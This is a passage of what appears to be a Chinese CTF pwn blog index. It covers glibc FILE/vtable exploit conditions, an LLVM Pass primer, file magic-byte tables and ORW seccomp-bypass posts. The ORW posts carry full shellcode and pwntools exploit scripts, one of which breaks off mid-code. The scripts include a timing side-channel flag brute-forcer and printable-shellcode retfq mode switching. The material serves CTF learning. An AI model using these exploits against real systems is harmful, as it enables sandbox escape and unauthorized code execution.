做进一步检查。\n\nfileno 与缓冲区的相关利用由于fwrite等函数会最终调用io函数，其缓冲区的初地址有buf_base决定，所以如果修改buf_base与buf_end就可以实现任意地址输入。\n_IO_str_jumps -&gt; overflowlibc中不仅仅只有_IO_file_jumps这么一个vtable，还有一个叫_IO_str_jumps的 ，这个 vtable 不在 check 范围之内。如果我们能设置文件指针的 vtable 为 _IO_str_jumps 么就能调用不一样的文件操作函数。\n 构造条件：\n\n\nfp-&gt;_flags &amp; _IO_NO_WRITES为假\n(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))\nfp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假\n2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数\nnew_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址\nfp+0xe0指向system地址\n\n\n_IO_str_jumps -&gt; finish 条件：_IO_buf_base 不为空_flags &amp; _IO_USER_BUF(0x01) 为假构造：_flags = (binsh_in_libc + 0x10) &amp; ~1_IO_buf_base = binsh_addr_freeres_list = 0x2_freeres_buf = 0x3_mode = -1vtable = _IO_str_finish - 0x18fp+0xe8 -&gt; system_addr\n\n","categories":["IO_File"],"tags":["IO_File"]},{"title":"LLVM PASS PWN（二）","url":"/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/","content":"LLVM PASS PWN（二）","categories":["LLVM PASS PWN"],"tags":["LLVM PASS PWN（二）"]},{"title":"LLVM PASS PWN（一）","url":"/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/","content":"LLVM PASS PWN（一）前置知识简述为什么要编译程序机器语言是用1和0组成的代码，但机器是识别不了1和0的，更具体的是如何识别的呢？对机器电路进行设计之后，机器能识别高电平还是低电平，刚好与2进制很相似，想输入0就给机器输入低电平，想输入1，就给机器输入高电平，所以就看到了1和0的表示形式\n机器语言它是计算机唯一能识别和执行的语言，但它的直观性差，可读性差，比如一串11110000111100001111机器可以快速识别是什么但是我们很难理解，再比如我们想要在屏幕上输出hello world那我们该如何用二进制来表示呢，所以汇编语言就诞生了\n汇编语言用助记符来表示机器指令中的操作码和操作数的指令系统，如a = 1，我们不需要去用二进制来理解，我们完全可以利用mov a, 1进行理解，那有没有更简单的方法呢，比如现在要输出hello wrold，还是需要十几行的汇编代码的，所以高级语言就诞生了\n高级语言是一种更接近人类的自然语言和数学语言的语言，比如想要a = 1，很直观就是a = 1，在很大程度上减少编程人员的编写量\n但是问题来了，机器只懂0和1那怎么才能让高级语言被机器识别，所以就有了编译，将高级语言（源语言）翻译成汇编语言或机器语言（目标语言），编译的根本目的就是把源代码变成目标代码\n编译的过程是什么编译过程主要可以划分为前端与后端，笔者用一张图简述一下\n\n前端把源代码翻译成IR，后端把IR编译成目标平台的机器码，这里笔者在查阅资料的时候发现有些会将生成中间代码放入前端，而有些资料会将生成中间代码放入后端\n在词法分析中编译器读入源代码，经过词法分析器识别出Token，比如词法分析器中识别出的Token可以是int, return, {, }等\n在语法分析中会把上面的Token串给转换成一个抽象语法树AST，AST树反映了程序的语法结构\n在语义分析中需要做的任务是理解语义，语句要做什么，如for是需要去实现循环，if是判断等\n在前端完成之后，会生成中间代码，统一优化中间代码，再去将中间代码生成目标代码\n前置知识这里笔者简述了一下，具体的可以移步编译原理\n\nLLVMLLVM IR &amp; LLVM Passgcc这个最经典的编译器提供的是一整套服务，前端和后端耦合在了一起，导致了如果一个新的编程语言出现可能需要设计一个新的IR以及实现这个IR的后端，如果出现了一个新的平台就要实现一个从自己的IR到新平台的后端，针对此类问题就出现了LLVM\n不同的前后端使用统一的中间代码，这样一个新的编程语言出现只需要实现一个新的前端，如果出现了一个新的平台只需要实现一个新的后端\nLLVM IR有三种表示形式\n\n可读IR，类似汇编代码，可以给人看的，后缀.ll\n不可读二进制IR，后缀.bc\n保存在内存中，内存格式\n\nLLVM Pass 是一个框架设计，是LLVM系统里重要的组成部分，因为LLVM Pass负责LLVM编译器绝大部分的工作，一系列的Pass组合，构建了编译器的转换和优化部分，抽象成结构化的编译器代码。\n在实现上，LLVM的核心库中会给你一些 Pass类 去继承。你需要实现它的一些方法。 最后使用LLVM的编译器会把它翻译得到的IR传入Pass里，给你遍历和修改。\nLLVM Pass的用处是插桩，机器无关的代码优化，静态分析，代码混淆等\nLLVM 工具以下内容来自LLVM Pass入门导引\n\nllvm-as：把LLVM IR从人类能看懂的文本格式汇编成二进制格式。注意：此处得到的不是目标平台的机器码。\nllvm-dis：llvm-as的逆过程，即反汇编。 不过这里的反汇编的对象是LLVM IR的二进制格式，而不是机器码。\nopt：优化LLVM IR。输出新的LLVM IR。\nllc：把LLVM IR编译成汇编码。需要用as进一步得到机器码。\nlli：解释执行LLVM IR。\n\nClangClang 是 LLVM 的前端，可以用来编译 C，C++，ObjectiveC 等语言。Clang 的功能包括：词法分析、语法分析、语义分析、生成中间中间代码LLVM Intermediate Representation (LLVM IR)。\nLLVM &amp; Clang环境安装 &amp; 工具测试ubuntu20.04下安装LLVM + Clang如下\n\nsudo apt install clang-12\nsudo apt install clang-8\nsudo apt install llvm-12\nsudo apt install llvm-8\n\nllvm-12安装之后可以使用opt-12，今年的ciscn的LLVM PASS PWN就是opt-12，一般题目都会给出opt的版本。ubuntu20.04应该自带opt-10如果没有的话，sudo apt install clang-10 &amp;&amp; sudo apt install llvm-10\n上面的做题环境都安装完成之后，先写一个c文件，利用Clang将c文件编译成.ll, .bc等格式看一下是否是如上所说，c文件如下\n#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(int argc, char **argv){    char name[0x20];    puts(\"hello world\");    puts(\"plz input your name\");    read(0, name, 0x1F);    printf(\"biubiubiu\");    return 0;}\n\n首先是.c-&gt;.ll，clang-12 -emit-llvm -S test.c -o test.ll，test.ll(生成的IR文本文件)如下\n; ModuleID = 'test.c'source_filename = \"test.c\"target datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\"target triple = \"x86_64-pc-linux-gnu\"@.str = private unnamed_addr constant [12 x i8] c\"hello world\\00\", align 1@.str.1 = private unnamed_addr constant [20 x i8] c\"plz input your name\\00\", align 1@.str.2 = private unnamed_addr constant [10 x i8] c\"biubiubiu\\00\", align 1; Function Attrs: noinline nounwind optnone uwtabledefine dso_local i32 @main(i32 %0, i8** %1) #0 {  %3 = alloca i32, align 4  %4 = alloca i32, align 4  %5 = alloca i8**, align 8  %6 = alloca [32 x i8], align 16  store i32 0, i32* %3, align 4  store i32 %0, i32* %4, align 4  store i8** %1, i8*** %5, align 8  %7 = call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))  %8 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))  %9 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0  %10 = call i64 @read(i32 0, i8* %9, i64 31)  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))  ret i32 0}declare dso_local i32 @puts(i8*) #1declare dso_local i64 @read(i32, i8*, i64) #1declare dso_local i32 @printf(i8*, ...) #1attributes #0 = { noinline nounwind optnone uwtable \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"min-legal-vector-width\"=\"0\" \"no-infs-fp-math\"=\"false\" \"no-jump-tables\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" }attributes #1 = { \"disable-tail-calls\"=\"false\" \"frame-pointer\"=\"all\" \"less-precise-fpmad\"=\"false\" \"no-infs-fp-math\"=\"false\" \"no-nans-fp-math\"=\"false\" \"no-signed-zeros-fp-math\"=\"false\" \"no-trapping-math\"=\"true\" \"stack-protector-buffer-size\"=\"8\" \"target-cpu\"=\"x86-64\" \"target-features\"=\"+cx8,+fxsr,+mmx,+sse,+sse2,+x87\" \"tune-cpu\"=\"generic\" \"unsafe-fp-math\"=\"false\" \"use-soft-float\"=\"false\" }!llvm.module.flags = !{!0}!llvm.ident = !{!1}!0 = !{i32 1, !\"wchar_size\", i32 4}!1 = !{!\"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5\"}\n\n上面的IR很直观，之前提到LLVM PASS的一个用处是优化IR代码，会将上面的可以优化的进行优化\n其次是.c-&gt;.bc，clang-12 -emit-llvm -c test.c -o test.bc，bc是不可读二进制\n\n然后是.ll -&gt; .bc，llvm-as test.ll -o test.bc，结果和上面的一样\n接着是.bc - &gt; .ll，llvm-dis test.bc -o test.ll，同上\n最后还有一个.bc -&gt; .s， llc test.bc -o test.s，将字节码的二进制格式文件转换为本地的汇编文件\n.text    .file   \"test.c\"    .globl  main                    # -- Begin function main    .p2align    4, 0x90    .type   main,@functionmain:                                   # @main    .cfi_startproc# %bb.0:    pushq   %rbp    .cfi_def_cfa_offset 16    .cfi_offset %rbp, -16    movq    %rsp, %rbp    .cfi_def_cfa_register %rbp    subq    $48, %rsp    movl    $0, -8(%rbp)    movl    %edi, -4(%rbp)    movq    %rsi, -16(%rbp)    movabsq $.L.str, %rdi    callq   puts    movabsq $.L.str.1, %rdi    callq   puts    leaq    -48(%rbp), %rsi    xorl    %edi, %edi    movl    $31, %edx    callq   read    movabsq $.L.str.2, %rdi    movb    $0, %al    callq   printf    xorl    %eax, %eax    addq    $48, %rsp    popq    %rbp    .cfi_def_cfa %rsp, 8    retq.Lfunc_end0:    .size   main, .Lfunc_end0-main    .cfi_endproc                                        # -- End function    .type   .L.str,@object          # @.str    .section    .rodata.str1.1,\"aMS\",@progbits,1.L.str:    .asciz  \"hello world\"    .size   .L.str, 12    .type   .L.str.1,@object        # @.str.1.L.str.1:    .asciz  \"plz input your name\"    .size   .L.str.1, 20    .type   .L.str.2,@object        # @.str.2.L.str.2:    .asciz  \"biubiubiu\"    .size   .L.str.2, 10    .ident  \"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5\"    .section    \".note.GNU-stack\",\"\",@progbits\n\n编写第一个LLVM Pass通过前面的知识之后，现在可以尝试编写“hello world”的pass，下面是官方的示例\n#include \"llvm/Pass.h\"#include \"llvm/IR/Function.h\"#include \"llvm/Support/raw_ostream.h\"#include \"llvm/IR/LegacyPassManager.h\"#include \"llvm/Transforms/IPO/PassManagerBuilder.h\"using namespace llvm;namespace {struct Hello : public FunctionPass {  static char ID;  Hello() : FunctionPass(ID) {}  bool runOnFunction(Function &amp;F) override {    errs() &lt;&lt; \"Hello: \";    errs().write_escaped(F.getName()) &lt;&lt; '\\n';    return false;  }}; // end of struct Hello}  // end of anonymous namespacechar Hello::ID = 0;static RegisterPass&lt;Hello&gt; X(\"hello\", \"Hello World Pass\",                             false /* Only looks at CFG */,                             false /* Analysis Pass */);static RegisterStandardPasses Y(    PassManagerBuilder::EP_EarlyAsPossible,    [](const PassManagerBuilder &amp;Builder,       legacy::PassManagerBase &amp;PM) { PM.add(new Hello()); });\n\n先声明pass本身，然后声明了一个Hello类，它是FunctionPass的子类。稍后将详细描述不同的内置pass子类，但是现在知道FunctionPass一次对一个函数进行操作。\n然后声明了LLVM用于标识pass的pass标识符。 这允许LLVM避免使用昂贵的C ++运行时信息，如下\nstatic char ID;Hello() : FunctionPass(ID) {}\n\n然后声明了一个runOnFunction方法，它覆盖了从FunctionPass继承的抽象虚方法。 这是我们应该做的事情，所以我们只用每个函数的名称打印出我们的消息。代码如下\nbool runOnFunction(Function &amp;F) override {    errs() &lt;&lt; \"Hello: \";    errs().write_escaped(F.getName()) &lt;&lt; '\\n';    return false;  }}; // end of struct Hello}  // end of anonymous namespace\n\n接着初始化passID。 LLVM使用ID的地址来标识pass，因此初始化值并不重要。代码如下\nchar Hello::ID = 0;\n\n最后，我们注册我们的类Hello，给它一个命令行参数“hello”，并命名为“Hello World Pass”。 最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，那么第三个参数设置为true; 如果pass是分析pass，例如支配树pass，则提供true作为第四个参数。代码如下\nstatic RegisterPass&lt;Hello&gt; X(\"hello\", \"Hello World Pass\",                             false /* Only looks at CFG */,                             false /* Analysis Pass */);\n\n如果我们想将通道注册为现有管道的一个步骤，则提供了一些扩展点，例如PassManagerBuilder::EP_EarlyAsPossible在任何优化之前应用我们的通道，或者PassManagerBuilder::EP_FullLinkTimeOptimizationLast 在链接时间优化之后应用它。代码如下\nstatic llvm::RegisterStandardPasses Y(    llvm::PassManagerBuilder::EP_EarlyAsPossible,    [](const llvm::PassManagerBuilder &amp;Builder,       llvm::legacy::PassManagerBase &amp;PM) { PM.add(new Hello()); });\n\n现在需要将这个Pass编译成模块，使用如下命令即可\nclang-12 `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared Hello.cpp -o LLVMHello.so `llvm-config --ldflags`\n\n现在应该会看到LLVMHello.so这个文件，通过官方文档可知需要使用以下命令\nopt -load LLVMHello.so -hello test.ll\n\n这里的 -hello由Hello.cpp中的static RegisterPass&lt;Hello&gt; X参数决定\n但是笔者这里报了一个错Error opening 'LLVMHello.so': LLVMHello.so: cannot open shared object file: No such file or directory，这是因为linux无法在默认地址找到LLVMHello.so，解决很简单`sudo cp LLVMHello.so /lib\n\n成功输出test.c所有函数名称\n对第一个LLVM Pass逆向分析刚刚生成了LLVMHello.so这个pass文件，比赛题和上面也一样，会重写FunctionPass类中的runOnFunction函数，所以我们对上面的示例程序进行逆向分析，看一下虚表位置这样方便比赛的时候确定每个函数的位置\n\n跟进RegisterPass\n\n发现调用了callDefaultCtor进行对象创建，跟进它\n\n给Hello对象分配了0x20个空间，跟进Hello\n\n看到虚表了，直接跟进\n\nrunOnFunction函数位于虚表中的最后一个位置，因为runOnFunction函数被我们重写了，所以它指向的是我们自定义的那个函数，比赛题的漏洞基本就是这个，所以在做LLVM Pass pwn的时候定位函数的位置可以从虚表入手\n总结收获很大，从编译过程到LLVM，加固了计算机底层的一些知识，知道了LLVM PASS PWN该怎么入手，以前看到LLVM PASS PWN的时候都不知道怎么运行（XD），这里第一篇就结束了，后面会继续更新\nReferencehttps://zhuanlan.zhihu.com/p/130702001\nhttps://zhuanlan.zhihu.com/p/122522485\nhttps://www.homedt.net/196837.html\nhttps://llvm.org/docs/WritingAnLLVMPass.html\n\n\n","categories":["LLVM PASS PWN"],"tags":["LLVM PASS PWN（一）"]},{"title":"常见文件文件头和隐写术总结 CTF中Misc必备","url":"/2023/09/27/Misc%20%E7%AC%94%E8%AE%B0/","content":"Misc常见文件文件头和隐写术总结 CTF中Misc必备前言对常见文件文件头和隐写术做个归纳总结\n\n文件头文件尾\n图片隐写\n音频隐写\n电子文档隐写\n\n一、文件头文件尾1、图片\nJPEG 文件头：FF D8 FF  文件尾：FF D9\nTGA 未压缩的前4字节 00 00 02 00 RLE压缩的前5字节 00 00 10 00 00\nPNG 文件头：89 50 4E 47 0D 0A 1A 0A  文件尾：AE 42 60 82\nGIF 文件头：47 49 46 38 39(37) 61  文件尾：00 3B\nBMP 文件头：42 4D 文件头标识(2 bytes) 42(B) 4D(M)\nTIFF (tif) 文件头：49 49 2A 00\nico 文件头：00 00 01 00\nAdobe Photoshop (psd) 文件头：38 42 50 53\n\n2、office文件\nMS Word/Excel (xls.or.doc) 文件头：D0 CF 11 E0\nMS Access (mdb) 文件头：53 74 61 6E 64 61 72 64 20 4A\nWordPerfect (wpd) 文件头：FF 57 50 43\nAdobe Acrobat (pdf) 文件头：25 50 44 46 2D 31 2E\napplication/vnd.visio(vsd) 文件头：D0 CF 11 E0 A1 B1 1A E1\nEmail [thorough only] (eml) 文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A\nOutlook Express (dbx) 文件头：CF AD 12 FE C5 FD 74 6F\nOutlook (pst) 文件头：21 42 44 4E\nRich Text Format (rtf) 文件头：7B 5C 72 74 66\ntxt 文件(txt) 文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的\n\n3、压缩包文件\nZIP Archive (zip) 文件头：50 4B 03 04 文件尾：50 4B\nRAR Archive (rar) 文件头：52 61 72 21\n\n4、音频文件\nWave (wav) 文件头：57 41 56 45\naudio(Audio) 文件头： 4D 54 68 64\naudio/x-aac（aac）\n文件头：FF F1(9)\n\n5、视频文件\nAVI (avi) 文件头：41 56 49 20\nReal Audio (ram) 文件头：2E 72 61 FD\nReal Media (rm) 文件头：2E 52 4D 46\nMPEG (mpg) 文件头：00 00 01 BA(3)\nQuicktime (mov) 文件头：6D 6F 6F 76\nWindows Media (asf) 文件头：30 26 B2 75 8E 66 CF 11\nMIDI (mid) 文件头：4D 54 68 64\n\n6、代码文件\nXML (xml) 文件头：3C 3F 78 6D 6C\nHTML (html) 文件头：68 74 6D 6C 3E\nQuicken (qdf) 文件头：AC 9E BD 8F\nWindows Password (pwl) 文件头：E3 82 85 96\n\n7、其他类型\nwindows证书文件(der) 文件头：30 82 03 C9\nCAD (dwg) 文件头：41 43 31 30\nWindows Shortcut (lnk) 文件头：4C 00 00 00\nWindows reg(reg) 文件头：52 45 47 45 44 49 54 34\n\n","categories":["Misc"],"tags":["misc"]},{"title":"ORW","url":"/2023/11/26/ORW%20%E9%A2%98%E5%9E%8B/","content":"最近复现强网杯2021赛题[shellcode]有感，特意来学习一下有关orw原理中缺少某些函数的情况如何进行ORW禁用沙箱规则我在之前提到过 [[prctl-seccomp]]参考了大佬!https://www.jianshu.com/p/754b0a2ae353\n普通 ORW\n32 位\n; \"/home/orw/flag\\x00\" 保存到栈上  ; 小端序  ; 要注意给字符串结尾加上 '\\x00'  push   0x006761  push   0x6c662f77  push   0x726f2f65  push   0x6d6f682f  ; open(\"/home/orw/flag\", O_RDONLY)  ; #define O_RDONLY 0   mov eax,5       ; open() 系统调用号是 5  mov ebx,esp ; \"/home/orw/flag\"  xor ecx,ecx     ; O_RDONLY = 0  xor edx,edx  int 0x80        ; int 80h 会报错  ; 返回 fd 保存到 eax 中  ; read(fd, buf, count)  mov ebx,eax     ; fd  mov eax,3       ; read() 的系统调用号是 3  mov ecx,esp     ; buf  mov edx,0x30    ; count  int 0x80  ; write(fd, buf, count)  mov eax,4       ; write() 的系统调用号是 4  mov ebx,1       ; fd=1, write到标准输出  mov ecx,esp     ; buf  mov edx,0x30    ; count  int 0x80\n\n64 位 (1). 版本一\n; open(\"flag\", 0)   0:   68 66 6c 61 67          push   0x67616c66   5:   6a 02                   push   0x2   7:   58                      pop    rax   8:   48 89 e7                mov    rdi,rsp   b:   48 31 f6                xor    rsi,rsi   e:   0f 05                   syscall    ; read(fd, rsp, 0x20)  10:   48 89 c7                mov    rdi,rax  13:   48 31 c0                xor    rax,rax  16:   48 89 e6                mov    rsi,rsp  19:   6a 20                   push   0x20  1b:   5a                      pop    rdx  1c:   0f 05                   syscall    ; write(1, rsp, 0x20)  1e:   6a 01                   push   0x1  20:   58                      pop    rax  21:   6a 01                   push   0x1  23:   5f                      pop    rdi  24:   48 89 e6                mov    rsi,rsp  27:   6a 20                   push   0x20  29:   5a                      pop    rdx  2a:   0f 05                   syscall\n\n(2). 版本二\n/* push b'flag\\x00' */push 0x67616c66/* call open('rsp', 0, 'O_RDONLY') */push (2) /* 2 */pop raxmov rdi, rspxor esi, esi /* 0 */cdq /* rdx=0 */syscall/* call sendfile(1, 'rax', 0, 2147483647) */mov r10d, 0x7fffffffmov rsi, raxpush (40) /* 0x28 */pop raxpush 1pop rdicdq /* rdx=0 */syscall\n\nOR 缺 W (例题: 2021-蓝帽杯初赛-slient)\n文件\n\n\n链接：https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA提取码：a6gt\n\n题目保护如下\n┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w]└─✨ checksec chall[*] '/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w/chall'    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n\n沙箱保护开启如下，只能允许read，open，禁用了write，那么意味着我们ORW组合技只有OR可以使用\nWelcome to silent execution-box. line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008 0005: 0x15 0x01 0x00 0x00000000  if (A == read) goto 0007 0006: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0008: 0x06 0x00 0x00 0x00000000  return KILL\n\n逆向代码分析\n  ......// 逆向代码片段  puts(\"Welcome to silent execution-box.\");  v3 = getpagesize();  // 利用 mmap 函数在 0x10000 处开辟一个 page 的空间  v9 = (int)mmap((void *)0x1000, v3, 7, 34, 0, 0LL);  read(0, &amp;buf, 0x40uLL);  // 设置沙盒  prctl(38, 1LL, 0LL, 0LL, 0LL);  prctl(4, 0LL);  v8 = seccomp_init(0LL);  seccomp_rule_add(v8, 2147418112LL, 2LL, 0LL);  seccomp_rule_add(v8, 2147418112LL, 0LL, 0LL);  seccomp_load(v8);  // 往 &amp;buf 中读入 0x40 字节数据  // 然后执行这段数据  v4 = buf;  ......  *(_OWORD *)v9 = v4;  ((void (__fastcall *)(__int64, __int64, __int64))v9)(0xDEADBEEFLL, 0xDEADBEEFLL, 0xDEADBEEFLL);  return 0LL;}\n\n// about mmap (link: https://man7.org/linux/man-pages/man2/mmap.2.html)// 1. SYNOPSIS#include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);/* 2. DESCRIPTION mmap() creates a new mapping in the virtual address space of the       calling process.  The starting address for the new mapping is       specified in addr.  The length argument specifies the length of       the mapping (which must be greater than 0).       If addr is NULL, then the kernel chooses the (page-aligned)       address at which to create the mapping; this is the most portable       method of creating a new mapping.  If addr is not NULL, then the       kernel takes it as a hint about where to place the mapping; on       Linux, the kernel will pick a nearby page boundary (but always       above or equal to the value specified by       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping       there.  If another mapping already exists there, the kernel picks       a new address that may or may not depend on the hint.  The       address of the new mapping is returned as the result of the call.......*/\n\n由 on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr) 可知：Linux 为 mmap 分配虚拟内存时，总是从最接近 addr 的页边缘开始的，而且保证地址不低于 /proc/sys/vm/mmap_min_addr 所指定的值。可以看到，mmap_min_addr = 65536 = 0x10000，因此刚才判断程序利用 mmap 函数在 0x10000 处开辟一个 page 的空间。\n┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w]└─✨ cat /proc/sys/vm/mmap_min_addr65536\n\n思路既然不能 `write`，便只能用 `open` 函数打开 flag 文件后将其中保存的 flag 用 `read` 函数读取出来，再逐字节遍历，与所有的打印字符用 `cmp` 进行比较，一个一个字节地爆破出来。详见 EXP。\n\nExp# -*- coding: utf-8 -*-  from pwn import *  import time    context(arch=\"amd64\", os=\"linux\")  # , log_level = \"debug\")      # 判断第 index 个字符是否是 chdef pwn(p, index, ch):      # 运行时需要去掉 shellcode 中的注释      # ; open(0x10039, 0)      # ; 0x10039 这个地址存放文件名      # ; fd 存放在 rax    shellcode = \"\"\"      push 0x10039    pop rdi    xor esi, esi    push 2    pop rax    syscall      mov rdi, rax    xor eax, eax    push 0x50    pop rdx    push 0x10040    pop rsi    syscall      loop:    cmp byte ptr[rsi+{0}], {1}    jz loop    ret    \"\"\".format(index, ch)      #     ; 此时 rsi 存放的即为保存 flag 的地址      #     ; 检查 flag[index] 是否等于 ch    #     ; 若相等便卡在这个循环里面        # 在这里写入文件名      payload = asm(shellcode).ljust(0x40 - 7, 'a') + './flag\\x00'      p.sendafter(\"Welcome to silent execution-box.\\n\", payload)      flag = \"\"  index = 0  last = 'a'  while True:      # 逐字符爆破      update = False      # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127)    for ch in range(32, 127):          sh = process(\"./chall\")          # 远程比较容易断，可以多次连接          '''          for i in range(10):            try:                sh = remote(\"1.1.1.1\", \"11111\")                break            except:                sleep(3)                continue        '''        pwn(sh, index, ch)          start = time.time()          try:              sh.recv(timeout=2)          except:              pass          end = time.time()          sh.close()          # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch        if (end - start &gt; 1.5):              flag += chr(ch)              last = chr(ch)              update = True              print(\"[ flag + 1 !!! ] \" + flag)              break        assert (update == True)        if (last == '}'):          break        index += 1    print(\"flag: \" + flag)\n\n\nRW 缺 O参考资料：shellcode 的艺术详情请看文章中的 “六、禁用了system和open，还限制了shellcode字符”，里面用 ex 师傅的一道题目为例。在 ex 师傅的这道题中，程序是 64 位的，禁用了 open 函数，但是允许调用 fstat 函数（该函数的 64 位系统调用号为 5，这个是 open 函数的 32 位系统调用号）。因此，这道题的基本思路就是利用 retfq 汇编指令进行 32 位和 64 位系统格式之间的切换，在 32 位格式下执行 open 函数打开 flag 文件，在 64 位格式下执行输入输出。而且，由于这道题限制输入的 shellcode 必须是可打印字符，在写 shellcode 的时候还需要使用一些技巧，基本思路就是：对于一些（对应的字节码是不可打印字符）的汇编指令，利用可打印字符之间的算术操作（主要是异或）来获取。具体可以参考文章中的 “三、限制字符”。下面是文章中的代码，自己加了一点注释：\n  #coding:utf-8from pwn import *context.log_level = 'debug'p = process('./shellcode')# p = remote(\"nc.eonew.cn\",\"10011\")p.recvuntil(\"shellcode: \")append_x86 = '''push ebxpop ebx'''append = '''/* 机器码: 52 5a */push rdxpop rdx'''shellcode_x86 = '''/*fp = open(\"flag\")*/mov esp,0x40404140/* s = \"flag\" */push 0x67616c66/* ebx = &amp;s */push esppop ebx/* ecx = 0 */xor ecx,ecxmov eax,5int 0x80mov ecx,eax'''shellcode_flag = '''/* retfq:  mode_32 -&gt; mode_64*/push 0x33push 0x40404089retfq/*read(fp,buf,0x70)*/mov rdi,rcxmov rsi,rspmov rdx,0x70xor rax,raxsyscall/*write(1,buf,0x70)*/mov rdi,1mov rax,1syscall'''shellcode_x86 = asm(shellcode_x86)shellcode_flag = asm(shellcode_flag, arch = 'amd64', os = 'linux')shellcode = ''# 0x40404040 为32位shellcode地址shellcode_mmap = '''/*mmap(0x40404040,0x7e,7,34,0,0)*/push 0x40404040 /*set rdi*/pop rdipush 0x7e /*set rsi*/pop rsipush 0x40 /*set rdx*/pop raxxor al,0x47push raxpop rdxpush 0x40 /*set r8*/pop raxxor al,0x40push raxpop r8push rax /*set r9*/pop r9/*syscall*//* syscall 的机器码是 0f 05, 都是不可打印字符. *//* 用异或运算来解决这个问题: 0x0f = 0x5d^0x52, 0x05 = 0x5f^0x5a. *//* 其中 0x52,0x5a 由 append 提供. */push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x31],clpush 0x5fpop rcxxor byte ptr[rax+0x32],clpush 0x22 /*set rcx*/pop rcxpush 0x40/*set rax*/pop raxxor al,0x49'''shellcode_read = '''/*read(0,0x40404040,0x70)*/push 0x40404040 /*set rsi*/pop rsipush 0x40 /*set rdi*/pop raxxor al,0x40push raxpop rdixor al,0x40 /*set rdx*/push 0x70pop rdx/*syscall*/push rbxpop raxpush 0x5dpop rcxxor byte ptr[rax+0x57],clpush 0x5fpop rcxxor byte ptr[rax+0x58],clpush rdx /*set rax*/pop raxxor al,0x70'''shellcode_retfq = '''/*mode_64 -&gt; mode_32*/push rbxpop raxxor al,0x40push 0x72pop rcxxor byte ptr[rax+0x40],clpush 0x68pop rcxxor byte ptr[rax+0x40],clpush 0x47pop rcxsub byte ptr[rax+0x41],clpush 0x48pop rcxsub byte ptr[rax+0x41],clpush rdipush rdipush 0x23push 0x40404040pop raxpush rax'''# mmapshellcode += shellcode_mmapshellcode += append# read shellcodeshellcode += shellcode_readshellcode += append# mode_64 -&gt; mode_32shellcode += shellcode_retfqshellcode += appendshellcode = asm(shellcode,arch = 'amd64',os = 'linux')print hex(len(shellcode))#gdb.attach(p,\"b *0x40027f\\nb*0x4002eb\\nc\\nc\\nsi\\n\")p.sendline(shellcode)pause()p.sendline(shellcode_x86 + 0x29*'\\x90' + shellcode_flag)p.interactive()\n\nR 缺 OW (例题: 2021-强网杯-初赛-shellcode)这道题其实就是 “R 缺 OW”，上面两种情况的融合怪。\n#coding:utf-8from pwn import *import time# context.log_level = 'debug'append_x86 = '''push ebxpop ebx'''append = '''push rdxpop rdx'''shellcode_x86 = '''/*fp = open(\"flag\")*/mov esp,0x40404140/* s = \"flag\" */push 0x67616c66/* ebx = &amp;s */push esppop ebx/* ecx = 0 */xor ecx,ecxmov eax,5int 0x80mov ecx,eax'''shellcode_x86 = asm(shellcode_x86)shellcode_mmap = '''/*mmap(0x40404040,0x7e,7,34,0,0)*/push 0x40404040 /*set rdi*/pop rdipush 0x7e /*set rsi*/pop rsipush 0x40 /*set rdx*/pop raxxor al,0x47push raxpop rdxpush 0x40 